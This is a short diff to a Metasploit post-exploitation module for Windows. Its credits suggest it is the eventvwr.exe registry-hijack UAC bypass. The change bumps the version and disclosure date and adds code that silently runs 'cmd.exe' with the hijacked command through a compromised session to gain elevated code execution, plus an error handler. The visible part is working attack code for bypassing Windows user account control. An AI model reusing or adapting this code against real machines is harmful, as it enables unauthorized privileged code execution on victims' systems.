@@ -98,8 +98,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln dicover : enigma0x3 | Matt Graeber', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
-                        'DisclosureDate' => 'jan 2 2017',
+                        'Version'        => '$Revision: 1.1',
+                        'DisclosureDate' => 'jan 3 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
@@ -184,7 +184,19 @@ def ls_stage1
  # give a proper time to refresh regedit
  Rex::sleep(5.0)
 
+      # start remote service to gain code execution
+      print_good(" Starting eventvwr.exe native proccess...")
+      r = session.sys.process.execute("cmd.exe /c #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
+      print_line("")
+      Rex::sleep(1.0)
 
+    # close channel when done
+    r.channel.close
+    r.close
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
 end
 
 
